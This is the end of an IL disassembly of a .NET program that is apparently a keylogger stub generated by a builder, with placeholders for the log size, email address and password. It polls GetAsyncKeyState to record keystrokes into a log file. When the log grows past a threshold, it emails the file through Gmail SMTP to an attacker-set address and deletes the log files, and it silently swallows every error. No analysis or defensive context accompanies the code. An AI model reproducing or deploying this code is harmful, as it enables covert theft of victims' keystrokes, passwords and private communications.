    IL_0795:  brtrue.s   IL_079e

    IL_0797:  ldstr      "Z"
    IL_079c:  br.s       IL_07a3

    IL_079e:  ldstr      "z"
    IL_07a3:  stsfld     object Library.Module1::l
    IL_07a8:  br         IL_098e

    IL_07ad:  ldc.i4     0xba
    IL_07b2:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_07b7:  ldc.i4.0
    IL_07b8:  cgt.un
    IL_07ba:  brfalse.s  IL_07da

    IL_07bc:  ldloc.3
    IL_07bd:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_07c2:  brtrue.s   IL_07cb

    IL_07c4:  ldstr      ";"
    IL_07c9:  br.s       IL_07d0

    IL_07cb:  ldstr      ":"
    IL_07d0:  stsfld     object Library.Module1::l
    IL_07d5:  br         IL_098e

    IL_07da:  ldc.i4     0xbb
    IL_07df:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_07e4:  ldc.i4.0
    IL_07e5:  cgt.un
    IL_07e7:  brfalse.s  IL_0807

    IL_07e9:  ldloc.3
    IL_07ea:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_07ef:  brtrue.s   IL_07f8

    IL_07f1:  ldstr      "="
    IL_07f6:  br.s       IL_07fd

    IL_07f8:  ldstr      "+"
    IL_07fd:  stsfld     object Library.Module1::l
    IL_0802:  br         IL_098e

    IL_0807:  ldc.i4     0xbc
    IL_080c:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0811:  ldc.i4.0
    IL_0812:  cgt.un
    IL_0814:  brfalse.s  IL_0834

    IL_0816:  ldloc.3
    IL_0817:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_081c:  brtrue.s   IL_0825

    IL_081e:  ldstr      ","
    IL_0823:  br.s       IL_082a

    IL_0825:  ldstr      "<"
    IL_082a:  stsfld     object Library.Module1::l
    IL_082f:  br         IL_098e

    IL_0834:  ldc.i4     0xbd
    IL_0839:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_083e:  ldc.i4.0
    IL_083f:  cgt.un
    IL_0841:  brfalse.s  IL_0861

    IL_0843:  ldloc.3
    IL_0844:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0849:  brtrue.s   IL_0852

    IL_084b:  ldstr      "-"
    IL_0850:  br.s       IL_0857

    IL_0852:  ldstr      "_"
    IL_0857:  stsfld     object Library.Module1::l
    IL_085c:  br         IL_098e

    IL_0861:  ldc.i4     0xbe
    IL_0866:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_086b:  ldc.i4.0
    IL_086c:  cgt.un
    IL_086e:  brfalse.s  IL_088e

    IL_0870:  ldloc.3
    IL_0871:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0876:  brtrue.s   IL_087f

    IL_0878:  ldstr      "."
    IL_087d:  br.s       IL_0884

    IL_087f:  ldstr      ">"
    IL_0884:  stsfld     object Library.Module1::l
    IL_0889:  br         IL_098e

    IL_088e:  ldc.i4     0xbf
    IL_0893:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0898:  ldc.i4.0
    IL_0899:  cgt.un
    IL_089b:  brfalse.s  IL_08bb

    IL_089d:  ldloc.3
    IL_089e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_08a3:  brtrue.s   IL_08ac

    IL_08a5:  ldstr      "/"
    IL_08aa:  br.s       IL_08b1

    IL_08ac:  ldstr      "\?"
    IL_08b1:  stsfld     object Library.Module1::l
    IL_08b6:  br         IL_098e

    IL_08bb:  ldc.i4     0xc0
    IL_08c0:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_08c5:  ldc.i4.0
    IL_08c6:  cgt.un
    IL_08c8:  brfalse.s  IL_08e8

    IL_08ca:  ldloc.3
    IL_08cb:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_08d0:  brtrue.s   IL_08d9

    IL_08d2:  ldstr      "`"
    IL_08d7:  br.s       IL_08de

    IL_08d9:  ldstr      "~"
    IL_08de:  stsfld     object Library.Module1::l
    IL_08e3:  br         IL_098e

    IL_08e8:  ldc.i4     0xdb
    IL_08ed:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_08f2:  ldc.i4.0
    IL_08f3:  cgt.un
    IL_08f5:  brfalse.s  IL_0912

    IL_08f7:  ldloc.3
    IL_08f8:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_08fd:  brtrue.s   IL_0906

    IL_08ff:  ldstr      "["
    IL_0904:  br.s       IL_090b

    IL_0906:  ldstr      "{"
    IL_090b:  stsfld     object Library.Module1::l
    IL_0910:  br.s       IL_098e

    IL_0912:  ldc.i4     0xdc
    IL_0917:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_091c:  ldc.i4.0
    IL_091d:  cgt.un
    IL_091f:  brfalse.s  IL_093c

    IL_0921:  ldloc.3
    IL_0922:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0927:  brtrue.s   IL_0930

    IL_0929:  ldstr      "\\"
    IL_092e:  br.s       IL_0935

    IL_0930:  ldstr      "|"
    IL_0935:  stsfld     object Library.Module1::l
    IL_093a:  br.s       IL_098e

    IL_093c:  ldc.i4     0xdd
    IL_0941:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0946:  ldc.i4.0
    IL_0947:  cgt.un
    IL_0949:  brfalse.s  IL_0966

    IL_094b:  ldloc.3
    IL_094c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0951:  brtrue.s   IL_095a

    IL_0953:  ldstr      "]"
    IL_0958:  br.s       IL_095f

    IL_095a:  ldstr      "}"
    IL_095f:  stsfld     object Library.Module1::l
    IL_0964:  br.s       IL_098e

    IL_0966:  ldc.i4     0xde
    IL_096b:  call       int16 Library.Module1::GetAsyncKeyState(int32)
    IL_0970:  ldc.i4.0
    IL_0971:  cgt.un
    IL_0973:  brfalse.s  IL_098e

    IL_0975:  ldloc.3
    IL_0976:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_097b:  brtrue.s   IL_0984

    IL_097d:  ldstr      "'"
    IL_0982:  br.s       IL_0989

    IL_0984:  ldstr      "\""
    IL_0989:  stsfld     object Library.Module1::l
    IL_098e:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_0993:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0998:  ldsfld     object Library.Module1::p
    IL_099d:  ldsfld     object Library.Module1::q
    IL_09a2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_09a7:  ldsfld     object Library.Module1::t
    IL_09ac:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_09b1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_09b6:  ldsfld     object Library.Module1::l
    IL_09bb:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_09c0:  ldc.i4.1
    IL_09c1:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                             string,
                                                                                                                             bool)
    IL_09c6:  ldnull
    IL_09c7:  stsfld     object Library.Module1::l
    IL_09cc:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_09d1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_09d6:  ldsfld     object Library.Module1::p
    IL_09db:  ldsfld     object Library.Module1::q
    IL_09e0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_09e5:  ldsfld     object Library.Module1::t
    IL_09ea:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_09ef:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_09f4:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_09f9:  brfalse    IL_0bd0

    IL_09fe:  call       class Library.My.MyComputer Library.My.MyProject::get_Computer()
    IL_0a03:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0a08:  ldsfld     object Library.Module1::p
    IL_0a0d:  ldsfld     object Library.Module1::q
    IL_0a12:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a17:  ldsfld     object Library.Module1::t
    IL_0a1c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a21:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0a26:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::ReadAllText(string)
    IL_0a2b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0a30:  conv.r8
    IL_0a31:  ldstr      "[logsize]"
    IL_0a36:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
    IL_0a3b:  ble.un     IL_0bd0

    .try
    {
      IL_0a40:  ldsfld     object Library.Module1::p
      IL_0a45:  ldsfld     object Library.Module1::q
      IL_0a4a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0a4f:  ldsfld     object Library.Module1::t
      IL_0a54:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0a59:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0a5e:  newobj     instance void [System]System.Net.Mail.Attachment::.ctor(string)
      IL_0a63:  stloc.s    V_5
      .try
      {
        IL_0a65:  newobj     instance void [System]System.Net.Mail.MailMessage::.ctor()
        IL_0a6a:  dup
        IL_0a6b:  ldstr      "[subject]"
        IL_0a70:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_Subject(string)
        IL_0a75:  stloc.s    V_6
        .try
        {
          IL_0a77:  ldstr      "[email]"
          IL_0a7c:  stloc.s    V_7
          IL_0a7e:  ldloc.s    V_6
          IL_0a80:  callvirt   instance class [System]System.Net.Mail.MailAddressCollection [System]System.Net.Mail.MailMessage::get_To()
          IL_0a85:  ldnull
          IL_0a86:  ldstr      "Add"
          IL_0a8b:  ldc.i4.1
          IL_0a8c:  newarr     [mscorlib]System.Object
          IL_0a91:  dup
          IL_0a92:  ldc.i4.0
          IL_0a93:  ldloc.s    V_7
          IL_0a95:  stelem.ref
          IL_0a96:  dup
          IL_0a97:  stloc.s    V_8
          IL_0a99:  ldnull
          IL_0a9a:  ldnull
          IL_0a9b:  ldc.i4.1
          IL_0a9c:  newarr     [mscorlib]System.Boolean
          IL_0aa1:  dup
          IL_0aa2:  ldc.i4.0
          IL_0aa3:  ldc.i4.1
          IL_0aa4:  stelem.i1
          IL_0aa5:  dup
          IL_0aa6:  stloc.s    V_9
          IL_0aa8:  ldc.i4.1
          IL_0aa9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool[],
                                                                                                                             bool)
          IL_0aae:  pop
          IL_0aaf:  ldloc.s    V_9
          IL_0ab1:  ldc.i4.0
          IL_0ab2:  ldelem.u1
          IL_0ab3:  brfalse.s  IL_0ac0

          IL_0ab5:  ldloc.s    V_8
          IL_0ab7:  ldc.i4.0
          IL_0ab8:  ldelem.ref
          IL_0ab9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0abe:  stloc.s    V_7
          IL_0ac0:  ldloc.s    V_6
          IL_0ac2:  ldloc.s    V_7
          IL_0ac4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0ac9:  newobj     instance void [System]System.Net.Mail.MailAddress::.ctor(string)
          IL_0ace:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_From(class [System]System.Net.Mail.MailAddress)
          IL_0ad3:  ldloc.s    V_6
          IL_0ad5:  ldstr      "[body]"
          IL_0ada:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_Body(string)
          IL_0adf:  ldloc.s    V_6
          IL_0ae1:  callvirt   instance class [System]System.Net.Mail.AttachmentCollection [System]System.Net.Mail.MailMessage::get_Attachments()
          IL_0ae6:  ldloc.s    V_5
          IL_0ae8:  castclass  [System]System.Net.Mail.Attachment
          IL_0aed:  callvirt   instance void class [mscorlib]System.Collections.ObjectModel.Collection`1<class [System]System.Net.Mail.Attachment>::Add(!0)
          IL_0af2:  ldstr      "smtp.gmail.com"
          IL_0af7:  newobj     instance void [System]System.Net.Mail.SmtpClient::.ctor(string)
          IL_0afc:  dup
          IL_0afd:  ldc.i4.1
          IL_0afe:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_EnableSsl(bool)
          IL_0b03:  dup
          IL_0b04:  ldloc.s    V_7
          IL_0b06:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0b0b:  ldstr      "[password]"
          IL_0b10:  newobj     instance void [System]System.Net.NetworkCredential::.ctor(string,
                                                                                         string)
          IL_0b15:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_Credentials(class [System]System.Net.ICredentialsByHost)
          IL_0b1a:  dup
          IL_0b1b:  ldstr      "587"
          IL_0b20:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
          IL_0b25:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_Port(int32)
          IL_0b2a:  stloc.s    V_10
          .try
          {
            IL_0b2c:  ldloc.s    V_10
            IL_0b2e:  ldloc.s    V_6
            IL_0b30:  callvirt   instance void [System]System.Net.Mail.SmtpClient::Send(class [System]System.Net.Mail.MailMessage)
            IL_0b35:  leave.s    IL_0b43

          }  // end .try
          finally
          {
            IL_0b37:  ldloc.s    V_10
            IL_0b39:  brfalse.s  IL_0b42

            IL_0b3b:  ldloc.s    V_10
            IL_0b3d:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
            IL_0b42:  endfinally
          }  // end handler
          IL_0b43:  leave.s    IL_0b51

        }  // end .try
        finally
        {
          IL_0b45:  ldloc.s    V_6
          IL_0b47:  brfalse.s  IL_0b50

          IL_0b49:  ldloc.s    V_6
          IL_0b4b:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
          IL_0b50:  endfinally
        }  // end handler
        IL_0b51:  leave.s    IL_0b64

      }  // end .try
      finally
      {
        IL_0b53:  ldloc.s    V_5
        IL_0b55:  brfalse.s  IL_0b63

        IL_0b57:  ldloc.s    V_5
        IL_0b59:  castclass  [mscorlib]System.IDisposable
        IL_0b5e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0b63:  endfinally
      }  // end handler
      IL_0b64:  leave.s    IL_0b72

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0b66:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0b6b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0b70:  leave.s    IL_0b72

    }  // end handler
    IL_0b72:  ldsfld     object Library.Module1::q
    IL_0b77:  ldc.i4.1
    IL_0b78:  box        [mscorlib]System.Int32
    IL_0b7d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                   object)
    IL_0b82:  stsfld     object Library.Module1::q
    IL_0b87:  ldsfld     object Library.Module1::p
    IL_0b8c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0b91:  call       string[] [mscorlib]System.IO.Directory::GetFiles(string)
    IL_0b96:  stloc.s    V_11
    IL_0b98:  ldc.i4.0
    IL_0b99:  stloc.s    V_12
    IL_0b9b:  br.s       IL_0bc8

    IL_0b9d:  ldloc.s    V_11
    IL_0b9f:  ldloc.s    V_12
    IL_0ba1:  ldelem.ref
    IL_0ba2:  stloc.s    V_13
    IL_0ba4:  ldloc.s    V_13
    IL_0ba6:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0bab:  brfalse.s  IL_0bc2

    .try
    {
      IL_0bad:  ldloc.s    V_13
      IL_0baf:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0bb4:  leave.s    IL_0bc2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0bb6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0bbb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0bc0:  leave.s    IL_0bc2

    }  // end handler
    IL_0bc2:  ldloc.s    V_12
    IL_0bc4:  ldc.i4.1
    IL_0bc5:  add.ovf
    IL_0bc6:  stloc.s    V_12
    IL_0bc8:  ldloc.s    V_12
    IL_0bca:  ldloc.s    V_11
    IL_0bcc:  ldlen
    IL_0bcd:  conv.i4
    IL_0bce:  blt.s      IL_0b9d

    IL_0bd0:  ldloc.0
    IL_0bd1:  ldc.i4.1
    IL_0bd2:  add
    IL_0bd3:  stloc.0
    IL_0bd4:  ldloc.0
    IL_0bd5:  ldc.i4     0xde
    IL_0bda:  ble        IL_0009

    IL_0bdf:  br         IL_0000
  } // end of method Module1::Main

} // end of class Library.Module1


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\root\source\repos\Library\bin\Release\stub.res
